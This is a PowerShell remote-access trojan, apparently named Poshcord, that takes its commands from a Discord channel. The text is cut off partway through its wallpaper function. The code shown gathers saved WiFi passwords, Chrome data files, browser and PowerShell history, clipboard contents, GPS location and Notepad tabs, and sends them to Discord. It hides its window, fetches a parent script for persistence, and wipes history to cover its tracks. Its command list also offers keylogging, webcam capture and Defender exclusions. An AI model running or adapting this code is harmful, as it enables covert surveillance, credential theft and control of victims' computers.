
# =====================================================================================================================================================
<#
    ExtraInfo: Get a list of further info and command examples

    Cleanup: Wipe history (run prompt, powershell, recycle bin, Temp)

    Kill: Stop a running module (eg. Keycapture / Exfiltrate)

    ControlAll: Control all waiting sessions simultaneously

    ShowAll: Control all waiting sessions simultaneously

    Pause: Pause the current authenticated session

    Close: Close this session

#>
# =====================================================================================================================================================

$token = "$tk" # make sure your bot is in the same server as the webhook
$chan = "$ch" # make sure the bot AND webhook can access this channel

# =============================================================== SCRIPT SETUP =========================================================================

$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
$spawnChannels = 1 # Create new channel on session start
$InfoOnConnect = 1 # Generate client info message on session start
$parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)

# remove restart stager (if present)
if(Test-Path "C:\Windows\Tasks\service.vbs"){
    $InfoOnConnect = 0
    rm -path "C:\Windows\Tasks\service.vbs" -Force
}

$version = "1.5.1" # Check version number
$response = $null
$previouscmd = $null
$authenticated = 0
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"

# =============================================================== MODULE FUNCTIONS =========================================================================

# --------------------------------------------------------------- HELP FUNCTIONS ------------------------------------------------------------------------

Function Options {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | Commands List "
            "description" = @"
- **SpeechToText**: Send audio transcript to Discord
- **Systeminfo**: Send System info as text file to Discord
- **QuickInfo**: Send a quick System info embed (sent on first connect)
- **FolderTree**: Save folder trees to file and send to Discord
- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
- **NearbyWifi**: Show nearby wifi networks (!user popup!)
- **ChromeDB**:  Gather Database files from Chrome and send to Discord

- **AddPersistance**: Add this script to startup.
- **RemovePersistance**: Remove Poshcord from startup
- **IsAdmin**: Check if the session is admin
- **Elevate**: Attempt to restart script as admin (!user popup!)
- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
- **EnableRDP**: Enable Remote Desktop on target.
- **EnableIO**: Enable Keyboard and Mouse
- **DisableIO**: Disable Keyboard and Mouse

- **RecordAudio**: Record microphone and send to Discord
- **RecordScreen**: Record Screen and send to Discord
- **TakePicture**: Send a webcam picture and send to Discord
- **Exfiltrate**: Send various files. (see ExtraInfo)
- **Upload**: Upload a file. (see ExtraInfo)
- **Download**: Download a file. (attach a file with the command)
- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
- **Screenshot**: Sends a screenshot of the desktop and send to Discord
- **Keycapture**: Capture Keystrokes and send to Discord

- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
- **Windows93**: Start parody Windows93 using Chrome
- **WindowsIdiot**: Start fake Windows95 using Chrome
- **SendHydra**: Never ending popups (use killswitch) to stop
- **SoundSpam**: Play all Windows default sounds on the target
- **Message**: Send a message window to the User (!user popup!)
- **VoiceMessage**: Send a message window to the User (!user popup!)
- **MinimizeAll**: Send a voice message to the User
- **EnableDarkMode**: Enable System wide Dark Mode
- **DisableDarkMode**: Disable System wide Dark Mode\
- **VolumeMax**: Maximise System Volume
- **VolumeMin**: Minimise System Volume
- **ShortcutBomb**: Create 50 shortcuts on the desktop.
- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
- **Goose**: Spawn an annoying goose (Sam Pearson App)
- **ScreenParty**: Start A Disco on screen!

- **ExtraInfo**: Get a list of further info and command examples
- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
- **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
- **ControlAll**: Control all waiting sessions simultaneously
- **ShowAll**: Show all waiting sessions in chat.
- **Pause**: Pause the current authenticated session
- **Close**: Close this session
"@
            color       = 65280
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function ExtraInfo {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | Extra Information "
            "description" = @"
``````Example Commands``````

**Default PS Commands:**
> PS> ``whoami`` (Returns Powershell commands)

**Exfiltrate Command Examples:**
> PS> ``Exfiltrate -Path Documents -Filetype png``
> PS> ``Exfiltrate -Filetype log``
> PS> ``Exfiltrate``
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

**Upload Command Example:**
> PS> ``Upload -Path C:/Path/To/File.txt``
Use 'FolderTree' command to show all files

**Enumerate-LAN Example:**
> PS> ``EnumerateLAN -Prefix 192.168.1.``
This Eg. will scan 192.168.1.1 to 192.168.1.254

**Prank Examples:**
> PS> ``Message 'Your Message Here!'``
> PS> ``VoiceMessage 'Your Message Here!'``
> PS> ``wallpaper -url http://img.com/f4wc``

**Record Examples:**
> PS> ``RecordAudio -t 100`` (number of seconds to record)
> PS> ``RecordScreen -t 100`` (number of seconds to record)

**Kill Command modules:**
- Keycapture
- Exfiltrate
- SendHydra
- SpeechToText
"@
            color       = 65280
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function CleanUp { 
    Remove-Item $env:temp\* -r -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSreadlineOption).HistorySavePath
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    sendMsg -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
}

# --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------

Function FolderTree{
    tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
    tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
    tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
    $FilePath ="$env:temp/TreesOfKnowledge.zip"
    Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
    sleep 1
    sendFile -sendfilePath $FilePath | Out-Null
    rm -Path $FilePath -Force
    Write-Output "Done."
}

Function EnumerateLAN{
param ([string]$Prefix)
    if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
    $FileOut = "$env:temp\Computers.csv"
    1..255 | ForEach-Object {
        $ipAddress = "$Prefix.$_"
        Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $ipAddress"
        }
    $Computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +', ',' |
                 ConvertFrom-Csv -Header Computername, IPv4, MAC, x, Vendor |
                 Select-Object IPv4, MAC
    $Computers | Export-Csv $FileOut -NoTypeInformation
    $data = Import-Csv $FileOut
    $data | ForEach-Object {
        $mac = $_.'MAC'
        $apiUrl = "https://api.macvendors.com/$mac"
        $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
        Start-Sleep -Seconds 1
        $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
        }
    $data | Export-Csv $FileOut -NoTypeInformation
    $data | ForEach-Object {
        try {
            $ip = $_.'IPv4'
            $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
            $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
        } 
        catch {
            $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
        }
    }
    $data | Export-Csv $FileOut -NoTypeInformation
    $results = Get-Content -Path $FileOut -Raw
    sendMsg -Message "``````$results``````"
    rm -Path $FileOut
}

Function NearbyWifi {
    $showNetworks = explorer.exe ms-availablenetworks:
    sleep 4
    $wshell = New-Object -ComObject wscript.shell
    $wshell.AppActivate('explorer.exe')
    $tab = 0
    while ($tab -lt 6){
        $wshell.SendKeys('{TAB}')
        sleep -m 100
        $tab++
    }
    $wshell.SendKeys('{ENTER}')
    sleep -m 200
    $wshell.SendKeys('{TAB}')
    sleep -m 200
    $wshell.SendKeys('{ESC}')
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
    $Wifi = ($NearbyWifi|Out-String)
    sendMsg -Message "``````$Wifi``````"
}

Function ChromeDB {
    $sourceDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
    $tempFolder = [System.IO.Path]::GetTempPath() + "loot"
    if (!(Test-Path $tempFolder)){
        New-Item -Path $tempFolder -ItemType Directory -Force
    }
    $filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' }
    foreach ($file in $filesToCopy) {
        $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
        $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension
        $destination = Join-Path -Path $tempFolder -ChildPath $newFileName
        Copy-Item -Path $file.FullName -Destination $destination -Force
    }
    $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "loot.zip")
    Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
    $tempFolders = Get-ChildItem -Path $tempFolder -Directory
    foreach ($folder in $tempFolders) {
        if ($folder.Name -ne "loot") {
            Remove-Item -Path $folder.FullName -Recurse -Force
        }
    }
    Remove-Item -Path $tempFolder -Recurse -Force
    sendFile -sendfilePath $zipFileName
}

Function SystemInfo{
sendMsg -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"
Add-Type -AssemblyName System.Windows.Forms
# WMI Classes
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$videocardinfo = Get-WmiObject Win32_VideoController
$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$processor = "$($processorInfo.Name)"
$gpu = "$($videocardinfo.Name)"
$DiskHealth = Get-PhysicalDisk | Select-Object DeviceID, FriendlyName, OperationalStatus, HealthStatus; $DiskHealth = ($DiskHealth | Out-String)
$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
# User Information
$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
$email = (Get-ComputerInfo).WindowsRegisteredOwner
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$OSString = "$($systemInfo.Caption)"
$OSArch = "$($systemInfo.OSArchitecture)"
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$users = "$($userInfo.Name)"
$userString = "`nFull Name : $($userInfo.FullName)"
$clipboard = Get-Clipboard
# System Information
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
# Nearby WiFi Networks
$showNetworks = explorer.exe ms-availablenetworks:
sleep 4
$wshell = New-Object -ComObject wscript.shell
$wshell.AppActivate('explorer.exe')
$tab = 0
while ($tab -lt 6){
$wshell.SendKeys('{TAB}')
$tab++
}
$wshell.SendKeys('{ENTER}')
$wshell.SendKeys('{TAB}')
$wshell.SendKeys('{ESC}')
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)
# Current System Metrics
function Get-PerformanceMetrics {
    $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue

    return [PSCustomObject]@{
        CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
        MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
        DiskIO = "{0:F2}" -f $diskIO.CookedValue
        NetworkIO = "{0:F2}" -f $networkIO.CookedValue
    }
}
$metrics = Get-PerformanceMetrics
$PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
$PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
$PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
$PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
# History and Bookmark Data
$Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}
$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$DataValues = @('history', 'bookmarks')
$outpath = "$env:temp\Browsers.txt"
foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]

        $Value = Get-Content -Path $Path | Select-String -AllMatches $Expression | % {($_.Matches).Value} | Sort -Unique

        $Value | ForEach-Object {
            [PSCustomObject]@{
                Browser  = $Browser
                DataType = $DataValue
                Content = $_
            }
        } | Out-File -FilePath $outpath -Append
    }
}
$Value = Get-Content -Path $outpath
$Value = ($Value | Out-String)
# Saved WiFi Network Info
$outssid = ''
$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws){
    if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
        $ssid=$s.Trim()
        if($s -Match ":"){
            $ssid=$s.Split(":")[1].Trim()
            }
        $pw=(netsh wlan show profiles name=$ssid key=clear)
        $pass="None"
        foreach($p in $pw){
            if($p -Match "Key Content"){
            $pass=$p.Split(":")[1].Trim()
            $outssid+="SSID: $ssid | Password: $pass`n-----------------------`n"
            }
        }
    }
    $a++
}
# GPS Location Info
Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
	Sleep -M 100
}  
if ($GeoWatcher.Permission -eq 'Denied'){
    $GPS = "Location Services Off"
}
else{
	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
	$GL = $GL -split " "
	$Lat = $GL[0].Substring(11) -replace ".$"
	$Lon = $GL[1].Substring(10) -replace ".$"
    $GPS = "LAT = $Lat LONG = $Lon"
}

function EnumNotepad{
$appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
$directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
$matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
foreach ($dir in $matchingDirectories) {
    $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
    $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
    foreach ($fullFilePath in $listOfBinFiles) {
        if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
            continue
        }
        $seperator = ("=" * 60)
        $SMseperator = ("-" * 60)
        $seperator | Out-File -FilePath $outpath -Append
        $filename = $fullFilePath.Name
        $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
        $isSavedFile = $contents[3]
        if ($isSavedFile -eq 1) {
            $lengthOfFilename = $contents[4]
            $filenameEnding = 5 + $lengthOfFilename * 2
            $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
            "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append

        } else {
            "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            $filenameEnding = 0
            $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
            $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
            $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
            $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
            $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
            $originalFileContent = ""
            for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
                if ($originalFileBytes[$i] -ne 0) {
                    $originalFileContent += [char]$originalFileBytes[$i]
                }
            }
            $originalFileContent | Out-File -FilePath $outpath -Append
        }
     "`n" | Out-File -FilePath $outpath -Append
    }
}
}

$infomessage = "
==================================================================================================================================
      _________               __                           .__        _____                            __  .__               
     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
==================================================================================================================================
"
$infomessage1 = "``````
=============================================================
SYSTEM INFORMATION FOR $env:COMPUTERNAME
=============================================================
User Information
-------------------------------------------------------------
Current User          : $env:USERNAME
Email Address         : $email
Language              : $systemLanguage
Keyboard Layout       : $keyboardLayoutID
Other Accounts        : $users
Current OS            : $OSString
Build ID              : $ver
Architechture         : $OSArch
Screen Size           : $screensize
Location              : $GPS
=============================================================
Hardware Information
-------------------------------------------------------------
Processor             : $processor 
Memory                : $RamInfo
Gpu                   : $gpu

Storage
----------------------------------------
$Hddinfo
$DiskHealth
Current System Metrics
----------------------------------------
$PMcpu
$PMmu
$PMdio
$PMnio
=============================================================
Network Information
-------------------------------------------------------------
Public IP Address     : $computerPubIP
``````"
$infomessage2 = "

Saved WiFi Networks
----------------------------------------
$outssid

Nearby Wifi Networks
----------------------------------------
$Wifi
==================================================================================================================================
History Information
----------------------------------------------------------------------------------------------------------------------------------
Clipboard Contents
---------------------------------------
$clipboard

Browser History
----------------------------------------
$Value

Powershell History
---------------------------------------
$pshistory

==================================================================================================================================
Recent File Changes Information
----------------------------------------------------------------------------------------------------------------------------------
$RecentFiles

==================================================================================================================================
USB Information
----------------------------------------------------------------------------------------------------------------------------------
$usbdevices

==================================================================================================================================
Software Information
----------------------------------------------------------------------------------------------------------------------------------
$software

==================================================================================================================================
Running Services Information
----------------------------------------------------------------------------------------------------------------------------------
$service

==================================================================================================================================
Current Processes Information
----------------------------------------------------------------------------------------------------------------------------------
$process

=================================================================================================================================="
$outpath = "$env:TEMP/systeminfo.txt"
$infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append

if ($OSString -like '*11*'){
    EnumNotepad
}
else{
    "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
}

sendMsg -Message $infomessage1
sendFile -sendfilePath $outpath
Sleep 1
Remove-Item -Path $outpath -force
}

# --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------

Function FakeUpdate {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"
}

Function Windows93 {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Windows 93 Sent..`` :arrows_counterclockwise:"
}

Function WindowsIdiot {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"
}

Function SendHydra {
    Add-Type -AssemblyName System.Windows.Forms
    sendMsg -Message ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"
    function Create-Form {
        $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
        $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
        $Close = New-Object Windows.Forms.Button;$Close.Text = "Close?";$Close.Width = 120;$Close.Height = 35;$Close.BackColor = [System.Drawing.Color]::White;$Close.ForeColor = [System.Drawing.Color]::Black;$Close.DialogResult = [System.Windows.Forms.DialogResult]::OK;$Close.Location = New-Object System.Drawing.Point(85, 100);$Close.Font = 'Microsoft Sans Serif,12,style=Bold'
        $form.Controls.AddRange(@($Text, $Close));return $form
    }
    while ($true) {
        $form = Create-Form
        $form.StartPosition = 'Manual'
        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
        $result = $form.ShowDialog()
    
        $messages = PullMsg
        if ($messages -match "kill") {
            sendMsg -Message ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"
            $previouscmd = $response
            break
        }
        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
            $form2 = Create-Form
            $form2.StartPosition = 'Manual'
            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $form2.Show()
        }
        $random = (Get-Random -Minimum 0 -Maximum 2)
        Sleep $random
    }
}

Function Message([string]$Message){
    msg.exe * $Message
    sendMsg -Message ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"
}

Function SoundSpam {
    param([Parameter()][int]$Interval = 3)
    sendMsg -Message ":white_check_mark: ``Spamming Sounds... Please wait..`` :white_check_mark:"
    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
    sendMsg -Message ":white_check_mark: ``Sound Spam Complete!`` :white_check_mark:"
}

Function VoiceMessage([string]$Message){
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak($Message)
    sendMsg -Message ":white_check_mark: ``Message Sent!`` :white_check_mark:"
}

Function MinimizeAll{
    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
    sendMsg -Message ":white_check_mark: ``Apps Minimised`` :white_check_mark:"
}

Function EnableDarkMode {
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 0
    Start-Sleep 1
    sendMsg -Message ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"
}

Function DisableDarkMode {
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 1
    Start-Sleep 1
    sendMsg -Message ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"
}

Function VolumeMax {
    Start-AudioControl
    [audio]::Volume = 1
}

Function VolumeMin {
    Start-AudioControl
    [audio]::Volume = 0
}

Function ShortcutBomb {
    $n = 0
    while($n -lt 50) {
        $num = Get-Random
        $AppLocation = "C:\Windows\System32\rundll32.exe"
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
        $Shortcut.TargetPath = $AppLocation
        $Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
        $Shortcut.IconLocation = "hotplug.dll,0"
        $Shortcut.Description ="Device Removal"
        $Shortcut.WorkingDirectory ="C:\Windows\System32"
        $Shortcut.Save()
        Start-Sleep 0.2
        $n++
    }
    sendMsg -Message ":white_check_mark: ``Shortcuts Created!`` :white_check_mark:"
}

Function Wallpaper {
param ([string[]]$url)
$outputPath = "$env:temp\img.jpg";$wallpaperStyle = 2;IWR -Uri $url -OutFile $outputPath
$signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
Add-Type -TypeDefinition $signature;$SPI_SETDESKWALLPAPER = 0x0014;$SPIF_UPDATEINIFILE = 0x01;$SPIF_SENDCHANGE = 0x02;[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
